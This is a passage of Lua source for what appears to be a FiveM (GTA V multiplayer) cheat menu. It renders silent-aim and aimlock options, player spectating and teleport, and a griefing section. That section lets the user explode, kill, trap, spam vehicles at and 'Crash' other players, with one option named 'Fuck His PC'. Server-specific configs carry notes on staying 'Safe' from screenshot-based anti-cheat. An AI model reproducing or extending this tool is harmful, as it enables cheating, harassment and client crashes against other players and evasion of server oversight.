               sum.f.checkbox('settings-MainFade', 'Background', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('settings-Line', 'Lines', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('settings-Fade', 'Highlight', 0.3875, y) 
           end y = y + add
   
           local y = 0.387+sum.st['settings'].static2
           if y >= 0.385 and y <= max then 
               sum.f.separator('Misc', 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Optimize FPS', 0.51, y) then 
                   sum.f.OptimezeFPS()
                   sum.f.sendNotification('Cleaned All Peds', 'Optimizing FPS')
                   sum.f.sendNotification('Cleaned All Props', 'Optimizing FPS')
                   sum.f.sendNotification('Cleaned All Vehicles', 'Optimizing FPS')
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('drawfsmarker', 'Show FPS', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('drawdick', '\83\104\111\119\32\85\73\68', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
           sum.f.separator('Configs', 0.51, y) y = y + add 
           end
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Load Config', {"G-Life", "Kubca", "Cofee"} , 0.51, y, sum.combo[16], function(currentIndex)
                   sum.combo[16] = currentIndex
               end) then
                   if sum.combo[16] == 1 then 
                       sum.f.GlifeConfig()
                       sum.f.tab = 'glife'
                       sum.f.sendNotification('G-Life config loaded!', 'Configs')
                       sum.f.sendNotification('Safe to use!','G-Life Features')
                       sum.f.sendNotification('Keep on mind Visuals can be seen on screenshot-basic','G-Life Visuals')
                       sum.f.sendNotification('Use redENGINE ESP','G-Life ESP')
                   elseif sum.combo[16] == 2 then 
                       sum.f.KubcaConfig()
                       sum.f.sendNotification('Kubca config loaded!', 'Configs')
                   elseif sum.combo[16] == 3 then 
                       sum.f.cofeeConfig()
                       sum.f.sendNotification('Cofee config loaded!', 'Configs')
                   end
               end
           end  y = y + add 
       end
   
       if sum.f.tab == 'aimbot' then 
           local y = 0.387+sum.st['aimbot'].static
           local add = 0.0155
           local max = 0.65+dH/1.06
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (1 * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['aimbot'].static = sum.st['aimbot'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['aimbot'].static = sum.st['aimbot'].static + add
           end
   
   
   
   
           sum.f.separator('Silent Aim', 0.3875, y) y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimbot', 'Silent Aim', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
                   if sum.f.combo('Target Hitbox', {"Head", "Neck", "Chest", "Stomach", "Pelvis"} , 0.3875, y, sum.combo[26], function(currentIndex)
                       sum.combo[26] = currentIndex
                           -- bones SKEL_ROOT = 0x0,SKEL_Pelvis = 0x2e28,SKEL_L_Thigh = 0xe39f,SKEL_L_Calf = 0xf9bb,SKEL_L_Foot = 0x3779,SKEL_L_Toe0 = 0x83c,IK_L_Foot = 0xfedd,PH_L_Foot = 0xe175,MH_L_Knee = 0xb3fe,SKEL_R_Thigh = 0xca72,SKEL_R_Calf = 0x9000,SKEL_R_Foot = 0xcc4d,SKEL_R_Toe0 = 0x512d,IK_R_Foot = 0x8aae,PH_R_Foot = 0x60e6,MH_R_Knee = 0x3fcf,RB_L_ThighRoll = 0x5c57,RB_R_ThighRoll = 0x192a,SKEL_Spine_Root = 0xe0fd,SKEL_Spine0 = 0x5c01,SKEL_Spine1 = 0x60f0,SKEL_Spine2 = 0x60f1,SKEL_Spine3 = 0x60f2,SKEL_L_Clavicle = 0xfcd9,SKEL_L_UpperArm = 0xb1c5,SKEL_L_Forearm = 0xeeeb,SKEL_L_Hand = 0x49d9,SKEL_L_Finger00 = 0x67f2,SKEL_L_Finger01 = 0xff9,SKEL_L_Finger02 = 0xffa,SKEL_L_Finger10 = 0x67f3,SKEL_L_Finger11 = 0x1049,SKEL_L_Finger12 = 0x104a,SKEL_L_Finger20 = 0x67f4,SKEL_L_Finger21 = 0x1059,SKEL_L_Finger22 = 0x105a,SKEL_L_Finger30 = 0x67f5,SKEL_L_Finger31 = 0x1029,SKEL_L_Finger32 = 0x102a,SKEL_L_Finger40 = 0x67f6,SKEL_L_Finger41 = 0x1039,SKEL_L_Finger42 = 0x103a,PH_L_Hand = 0xeb95,IK_L_Hand = 0x8cbd,RB_L_ForeArmRoll = 0xee4f,RB_L_ArmRoll = 0x1470,MH_L_Elbow = 0x58b7,SKEL_R_Clavicle = 0x29d2,SKEL_R_UpperArm = 0x9d4d,SKEL_R_Forearm = 0x6e5c,SKEL_R_Hand = 0xdead,SKEL_R_Finger00 = 0xe5f2,SKEL_R_Finger01 = 0xfa10,SKEL_R_Finger02 = 0xfa11,SKEL_R_Finger10 = 0xe5f3,SKEL_R_Finger11 = 0xfa60,SKEL_R_Finger12 = 0xfa61,SKEL_R_Finger20 = 0xe5f4,SKEL_R_Finger21 = 0xfa70,SKEL_R_Finger22 = 0xfa71,SKEL_R_Finger30 = 0xe5f5,SKEL_R_Finger31 = 0xfa40,SKEL_R_Finger32 = 0xfa41,SKEL_R_Finger40 = 0xe5f6,SKEL_R_Finger41 = 0xfa50,SKEL_R_Finger42 = 0xfa51,PH_R_Hand = 0x6f06,IK_R_Hand = 0x188e,RB_R_ForeArmRoll = 0xab22,RB_R_ArmRoll = 0x90ff,MH_R_Elbow = 0xbb0,SKEL_Neck_1 = 0x9995,SKEL_Head = 0x796e,IK_Head = 0x322c,FACIAL_facialRoot = 0xfe2c,FB_L_Brow_Out_000 = 0xe3db,FB_L_Lid_Upper_000 = 0xb2b6,FB_L_Eye_000 = 0x62ac,FB_L_CheekBone_000 = 0x542e,FB_L_Lip_Corner_000 = 0x74ac,FB_R_Lid_Upper_000 = 0xaa10,FB_R_Eye_000 = 0x6b52,FB_R_CheekBone_000 = 0x4b88,FB_R_Brow_Out_000 = 0x54c,FB_R_Lip_Corner_000 = 0x2ba6,FB_Brow_Centre_000 = 0x9149,FB_UpperLipRoot_000 = 0x4ed2,FB_UpperLip_000 = 0xf18f,FB_L_Lip_Top_000 = 0x4f37,FB_R_Lip_Top_000 = 0x4537,FB_Jaw_000 = 0xb4a0,FB_LowerLipRoot_000 = 0x4324,FB_LowerLip_000 = 0x508f,FB_L_Lip_Bot_000 = 0xb93b,FB_R_Lip_Bot_000 = 0xc33b,FB_Tongue_000 = 0xb987,RB_Neck_1 = 0x8b93,IK_Root = 0xdd1c
                   end) then
                   end
               end 
           end  y = y + add ;
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimbot-peds', 'Target Peds', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimbot-deads', 'Target Deads', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimbot-vischeck', 'Visible Check', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimbot-fov', 'Draw FOV', 0.3875, y) 
           end y = y + add            
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['weapons-aimbot-fov'], 0.3875, y, 2)
           end y = y + add
           sum.f.separator('Aimlock', 0.3875, y) y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimlock', 'Aimlock', 0.3875, y) 
           end y = y + add ;
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
                   if sum.f.combo('Target Hitbox', {"Head", "Neck", "Chest", "Stomach", "Pelvis"} , 0.3875, y, sum.combo[17], function(currentIndex)
                       sum.combo[17] = currentIndex
                           -- bones SKEL_ROOT = 0x0,SKEL_Pelvis = 0x2e28,SKEL_L_Thigh = 0xe39f,SKEL_L_Calf = 0xf9bb,SKEL_L_Foot = 0x3779,SKEL_L_Toe0 = 0x83c,IK_L_Foot = 0xfedd,PH_L_Foot = 0xe175,MH_L_Knee = 0xb3fe,SKEL_R_Thigh = 0xca72,SKEL_R_Calf = 0x9000,SKEL_R_Foot = 0xcc4d,SKEL_R_Toe0 = 0x512d,IK_R_Foot = 0x8aae,PH_R_Foot = 0x60e6,MH_R_Knee = 0x3fcf,RB_L_ThighRoll = 0x5c57,RB_R_ThighRoll = 0x192a,SKEL_Spine_Root = 0xe0fd,SKEL_Spine0 = 0x5c01,SKEL_Spine1 = 0x60f0,SKEL_Spine2 = 0x60f1,SKEL_Spine3 = 0x60f2,SKEL_L_Clavicle = 0xfcd9,SKEL_L_UpperArm = 0xb1c5,SKEL_L_Forearm = 0xeeeb,SKEL_L_Hand = 0x49d9,SKEL_L_Finger00 = 0x67f2,SKEL_L_Finger01 = 0xff9,SKEL_L_Finger02 = 0xffa,SKEL_L_Finger10 = 0x67f3,SKEL_L_Finger11 = 0x1049,SKEL_L_Finger12 = 0x104a,SKEL_L_Finger20 = 0x67f4,SKEL_L_Finger21 = 0x1059,SKEL_L_Finger22 = 0x105a,SKEL_L_Finger30 = 0x67f5,SKEL_L_Finger31 = 0x1029,SKEL_L_Finger32 = 0x102a,SKEL_L_Finger40 = 0x67f6,SKEL_L_Finger41 = 0x1039,SKEL_L_Finger42 = 0x103a,PH_L_Hand = 0xeb95,IK_L_Hand = 0x8cbd,RB_L_ForeArmRoll = 0xee4f,RB_L_ArmRoll = 0x1470,MH_L_Elbow = 0x58b7,SKEL_R_Clavicle = 0x29d2,SKEL_R_UpperArm = 0x9d4d,SKEL_R_Forearm = 0x6e5c,SKEL_R_Hand = 0xdead,SKEL_R_Finger00 = 0xe5f2,SKEL_R_Finger01 = 0xfa10,SKEL_R_Finger02 = 0xfa11,SKEL_R_Finger10 = 0xe5f3,SKEL_R_Finger11 = 0xfa60,SKEL_R_Finger12 = 0xfa61,SKEL_R_Finger20 = 0xe5f4,SKEL_R_Finger21 = 0xfa70,SKEL_R_Finger22 = 0xfa71,SKEL_R_Finger30 = 0xe5f5,SKEL_R_Finger31 = 0xfa40,SKEL_R_Finger32 = 0xfa41,SKEL_R_Finger40 = 0xe5f6,SKEL_R_Finger41 = 0xfa50,SKEL_R_Finger42 = 0xfa51,PH_R_Hand = 0x6f06,IK_R_Hand = 0x188e,RB_R_ForeArmRoll = 0xab22,RB_R_ArmRoll = 0x90ff,MH_R_Elbow = 0xbb0,SKEL_Neck_1 = 0x9995,SKEL_Head = 0x796e,IK_Head = 0x322c,FACIAL_facialRoot = 0xfe2c,FB_L_Brow_Out_000 = 0xe3db,FB_L_Lid_Upper_000 = 0xb2b6,FB_L_Eye_000 = 0x62ac,FB_L_CheekBone_000 = 0x542e,FB_L_Lip_Corner_000 = 0x74ac,FB_R_Lid_Upper_000 = 0xaa10,FB_R_Eye_000 = 0x6b52,FB_R_CheekBone_000 = 0x4b88,FB_R_Brow_Out_000 = 0x54c,FB_R_Lip_Corner_000 = 0x2ba6,FB_Brow_Centre_000 = 0x9149,FB_UpperLipRoot_000 = 0x4ed2,FB_UpperLip_000 = 0xf18f,FB_L_Lip_Top_000 = 0x4f37,FB_R_Lip_Top_000 = 0x4537,FB_Jaw_000 = 0xb4a0,FB_LowerLipRoot_000 = 0x4324,FB_LowerLip_000 = 0x508f,FB_L_Lip_Bot_000 = 0xb93b,FB_R_Lip_Bot_000 = 0xc33b,FB_Tongue_000 = 0xb987,RB_Neck_1 = 0x8b93,IK_Root = 0xdd1c
                   end) then
                   end
               end 
           end  y = y + add ;
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimlock-peds', 'Target Peds', 0.3875, y) 
           end y = y + add ; 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimlock-deads', 'Target Deads', 0.3875, y) 
           end y = y + add ; 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimlock-vischeck', 'Visible Check', 0.3875, y) 
           end y = y + add ; 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('weapons-aimlock-fov', 'Draw FOV', 0.3875, y) 
           end y = y + add ;                
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['weapons-aimlock-fov'], 0.3875, y, 2)
           end y = y + add ; 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Smoothing', 0.3875, y) then 
                   
               end
           end y = y + add ; 
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['weapons-aimlock-smooth'], 0.3875, y, 2)
           end y = y + add ; 
       end
   
       if sum.f.tab == 'players' then 
   
           sum.f.DrawRect(0.67+drag_X+dW, 0.44+drag_Y, 0.082, 0.102*1.8, 22, 22, 22, 255)
           sum.f.DrawRect(0.67+drag_X+dW, 0.44+drag_Y, 0.081, 0.101*1.8, 55, 55, 55, 255)
           sum.f.DrawRect(0.67+drag_X+dW, 0.44+drag_Y, 0.08, 0.1*1.8, 22, 22, 22, 255)
           local rX, rY = sum.f.GetActiveScreenResolution()
           local veh = sum.f.GetDisplayNameFromVehicleModel(sum.f.GetEntityModel(sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer))))
           sum.f.DrawSprite('mpentry', 'mp_modenotselected_gradient',0.67+drag_X+dW, 0.359+drag_Y, 0.12, 22/rY, 0.0, 1, 1, 1, 255)
           sum.f.drawText('Player Info', 0.67+drag_X+dW, 0.3595+drag_Y, 0.27, 4, true)
           
   
           sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient',0.67+drag_X+dW, 0.44+drag_Y-((0.1*1.8)/2), 0.08, 2/rY, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
           sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient',0.67+drag_X+dW, 0.44+drag_Y+((0.1*1.8)/2), 0.08, 2/rY, 0.0, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
           
           local y = 0.375 
           sum.f.drawText('Name: '.. sum.f.GetPlayerName(sel.selectedPlayer), 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
           sum.f.drawText('Server ID: '.. sum.f.GetPlayerServerId(sel.selectedPlayer), 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
           sum.f.drawText('Vehicle: '.. string.lower(veh), 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
   
           local args = sum.f.GetDistanceBetweenCoords(sum.f.GetEntityCoords(sum.f.PlayerPedId()),sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)),true)
           local dist = tonumber(sum.curak.format("%.1f", args)) 
           sum.f.drawText('Distance: '.. dist.. ' m', 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
   
           sum.f.drawText('Health: '.. sum.f.GetEntityHealth(sum.f.GetPlayerPed(sel.selectedPlayer)) - 100 .. '/ 100', 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
           sum.f.drawText('Armor: '.. sum.f.GetPedArmour(sum.f.GetPlayerPed(sel.selectedPlayer)) .. '/100', 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
   
   
           local X = tonumber(sum.curak.format("%.1f", sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)).x)) 
           sum.f.drawText('Coord X: '.. X, 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
   
           local Y = tonumber(sum.curak.format("%.1f", sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)).y)) 
           sum.f.drawText('Coord Y: '.. Y, 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
   
           local Z = tonumber(sum.curak.format("%.1f", sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)).z)) 
           sum.f.drawText('Coord Z: '.. Z, 0.63+dW+drag_X, y+drag_Y, 0.27, 4, false) y = y + 0.015
   
   
   
           local y = 0.387+0.0155+sum.st['players'].static
           local add = 0.0155
           local max = 0.65+dH/1.06
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387+0.0155 - ((#sum.f.GetActivePlayers()-16) * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['players'].static = sum.st['players'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387+0.0155 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['players'].static = sum.st['players'].static + add
           end
   
           sum.f.separator('Online Players', 0.3875, 0.387) 
       
           for k, v in pairs(sum.f.GetActivePlayers()) do 
               if y >= 0.4 and y <= max then 
                   if v == sel.selectedPlayer then 
                       if sum.f.button('[~r~!~s~] ' .. sum.f.GetPlayerName(v), 0.3875, y) then 
                           sel.selectedPlayer = v
                       end
                   else
                       if sum.f.button('[~c~?~s~] ' .. sum.f.GetPlayerName(v), 0.3875, y) then 
                           sel.selectedPlayer = v
                       end
                   end
               end y = y + add  
           end
   
   
           local y = 0.387+sum.st['players'].static2
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (29 * add)) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['players'].static2 = sum.st['players'].static2 - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['players'].static2 = sum.st['players'].static2 + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('General', 0.51, y) 
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('troll-spectate', 'Spectate', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
                   if sum.f.combo('Teleport to', {"Player", "Vehicle"} , 0.51, y, sum.combo[3], function(currentIndex)
                       sum.combo[3] = currentIndex
                   end) then
                       if sum.combo[3] == 1 then 
                           sum.f.sendNotification('Teleported To '..sum.f.GetPlayerName(sel.selectedPlayer), 'Online')
                           sum.f.SetEntityCoords(sum.f.PlayerPedId(), sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)))
                       elseif sum.combo[3] == 2 then 
                           sum.f.teltoplayveh(sel.selectedPlayer)
                       end
                   end
               end 
           end
           y = y + add
       
           if y >= 0.385 and y <= max then 
               if y >= 0.385 and y <= max then 
                   if sum.f.button('Copy Outfit', 0.51, y) then 
                       local player = sel.selectedPlayer
                       local model = sum.f.GetEntityModel(sum.f.GetPlayerPed(player))
                       sum.f.SetPlayerModel(sum.f.PlayerId(), model)
                       sum.f.sendNotification('Copied outfit from '..sum.f.GetPlayerName(player), 'Online')
                       sum.curak.wait(100)
                       sum.f.ClonePedToTarget(sum.f.GetPlayerPed(player), sum.f.PlayerPedId())
                   end
               end 
           end
           y = y + add
           
           if y >= 0.385 and y <= max then 
               sum.f.separator('Troll', 0.51, y) 
           end
           y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Grief', {"Explode", "Hydrant", "Taze", "Snipe Shot", "EarRape"} , 0.51, y, sum.combo[4], function(currentIndex)
                   sum.combo[4] = currentIndex
               end) then
                   if sum.combo[4] == 1 then 
                       local player = sel.selectedPlayer
                           sum.f.AddExplosion(sum.f.GetEntityCoords(sum.f.GetPlayerPed(player)), 7, 1000.0, true, false, false)
                   elseif sum.combo[4] == 2 then 
                       local player = sel.selectedPlayer
                       sum.f.AddExplosion(sum.f.GetEntityCoords(sum.f.GetPlayerPed(player)), 13, 1000.0, true, false, false)
                   elseif sum.combo[4] == 3 then 
                       local player = sel.selectedPlayer
                       sum.f.tazehim()
                   elseif sum.combo[4] == 4 then 
                       local player = sel.selectedPlayer
                       sum.f.snipehim()
                   elseif sum.combo[4] == 5 then 
                       local player = sel.selectedPlayer
                       sum.f.AddExplosion(sum.f.GetEntityCoords(sum.f.GetPlayerPed(player)), 61, 0, true, true, 0)
                   end
               end
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('explode-sucker', 'Explode', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('earrape-sucker', 'EarRape', 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('kill-selectedplayer', 'Kill Player', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('speak-sucker', 'Speak To Explode', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('speak2-sucker', 'Speak To Die', 0.51, y) 
           end 
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('speak3-sucker', 'Speak To Taze', 0.51, y) 
           end 
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.separator('Friendly', 0.51, y) 
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('selectedplayer-shockwavegun', 'Shockwave Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('selectedplayer-explodegun', 'Explode Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('selectedplayer-pedgun', 'Ped Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('selectedplayer-propgun', 'Prop Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('selectedplayer-ramgun', 'Ram Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('selectedplayer-vehiclegun', 'Vehicle Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('selectedplayer-particlegun', 'Particle Gun', 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Entities', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Turn Player In To', {"Silo","Yacht","Maze Bank","Plane", "Generator", "Logs", "X-Mas Tree", "Oak Tree", "JetSki", "Bush", "Stunt Tube", "Apartman", "Rock"} , 0.51, y, sum.combo[7], function(currentIndex)
                   sum.combo[7] = currentIndex
               end) then
                   if sum.combo[7] == 1 then 
                    sum.f.Playrstoprop('ce_xr_ctr2')
                   elseif sum.combo[7] == 2 then 
                    sum.f.Playrstoprop('apa_mp_apa_yacht')
                   elseif sum.combo[7] == 3 then 
                     sum.f.Playrstoprop('dt1_11_dt1_tower_lod')
                   elseif sum.combo[7] == 4 then   
                     sum.f.Playrstoprop('apa_mp_apa_crashed_usaf_01a')
                   elseif sum.combo[7] == 5 then   
                       sum.f.Playrstoprop('prop_byard_machine03')
                   elseif sum.combo[7] == 6 then   
                       sum.f.Playrstoprop('prop_logpile_02')
                   elseif sum.combo[7] == 7 then   
                       sum.f.Playrstoprop('prop_xmas_ext')
                   elseif sum.combo[7] == 8 then   
                       sum.f.Playrstoprop('prop_tree_olive_cr2')
                   elseif sum.combo[7] == 9 then   
                       sum.f.Playrstoprop('prop_jetski_trailer_01')
                   elseif sum.combo[7] == 10 then   
                       sum.f.Playrstoprop('prop_bush_lrg_01e_cr')
                   elseif sum.combo[7] == 11 then   
                       sum.f.Playrstoprop('bkr_prop_biker_tube_l')
                   elseif sum.combo[7] == 12 then   
                       sum.f.Playrstoprop('db_apart_01_')
                   elseif sum.combo[7] == 13 then   
                       sum.f.Playrstoprop('csx_seabed_rock7_')
                   end
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Attack Player', {"Terrorists","Gangsters","Monkeys","Dogs", "Army"} , 0.51, y, sum.combo[5], function(currentIndex)
                   sum.combo[5] = currentIndex
               end) then
                   if sum.combo[5] == 1 then 
                    sum.f.terroristattack()
                   elseif sum.combo[5] == 2 then 
                    sum.f.gangsterattack()
                   elseif sum.combo[5] == 3 then 
                     sum.f.monkeyattack()
                   elseif sum.combo[5] == 4 then   
                     sum.f.dogattack()
                   elseif sum.combo[5] == 5 then   
                       sum.f.armyattack()
                   end
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Stuck Player', 0.51, y) then 
                   sum.f.TrapPlayer(sum.f.GetPlayerPed(sel.selectedPlayer))
               end 
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('crash-sucker', 'Crash', 0.51, y) 
           end 
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('fuckhispc-sucker', 'Fuck His PC', 0.51, y) 
           end 
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('trash-sucker', 'Spawn trash', 0.51, y) 
           end 
   
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.separator('Vehicle', 0.51, y) 
           end y = y + add
           
           if y >= 0.385 and y <= max then 
               if sum.f.combo('NPC Actions', {"Drive To Player", "Attack Player", "Teleport To Player"} , 0.51, y, sum.combo[13], function(currentIndex)
                   sum.combo[13] = currentIndex
               end) then
                   if sum.combo[13] == 1 then 
                       sum.f.DriveToPlayer()
                   elseif sum.combo[13] == 2 then 
                       sum.f.AttackPlayer()
                   elseif sum.combo[13] == 2 then 
                       sum.f.TeleportCarsToaPlayer()
                   end
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Vehicle Tricks', {"Kick Flip", "Back Flip", "Jump"} , 0.51, y, sum.combo[18], function(currentIndex)
                   sum.combo[18] = currentIndex
               end) then
                   if sum.combo[18] == 1 then
                       if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                           sum.f.requestControlOnce(veh)
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)          
                           sum.f.ApplyForceToEntity(veh, 1, 0.0, 0.0, 10.0, 90.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                       end
                   elseif sum.combo[18] == 2 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                           sum.f.requestControlOnce(veh)
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)          
                           sum.f.ApplyForceToEntity(veh, 1, 0.0, 0.0, 15.0, 0.0, 60.0, 0.0, 0, 0, 1, 1, 0, 0)
                       end
                   elseif sum.combo[18] == 3 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                           sum.f.requestControlOnce(veh)
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)          
                           sum.f.ApplyForceToEntity(veh, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 00.0, 0, 1, 0, 1, 0, 0)
                       end
                   end
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Destroy Vehicle', 0.51, y) then 
                   sum.f.DestroyCar()
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('FiveSense Plate', 0.51, y) then 
                   if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)          
                       sum.f.SetVehicleNumberPlateText(veh, "FIVESENS")
                   end
               end
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('POP Tires', 0.51, y) then 
                   if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(sel.selectedPlayer, 0)) then 
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.GetPlayerPed(sel.selectedPlayer), true)
                       sum.f.SetVehicleTyreBurst(veh, 0, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 1, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 2, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 3, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 5, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 4, true, 1000.0)sum.f.SetVehicleTyreBurst(veh, 7, true, 1000.0)
                   end    
               end
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('cars-sucker', 'Spam Cars', 0.51, y) 
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('sucker-animplate', 'Bug Vehicle', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('sucker-launch', 'Launch Vehicle', 0.51, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('sucker-slam', 'Slam Vehicle', 0.51, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('sucker-explode-loop', 'Explode Vehicle', 0.51, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('sucker-stick', 'Stick Vehicle', 0.51, y) 
           end y = y + add
           
           if y >= 0.385 and y <= max then 
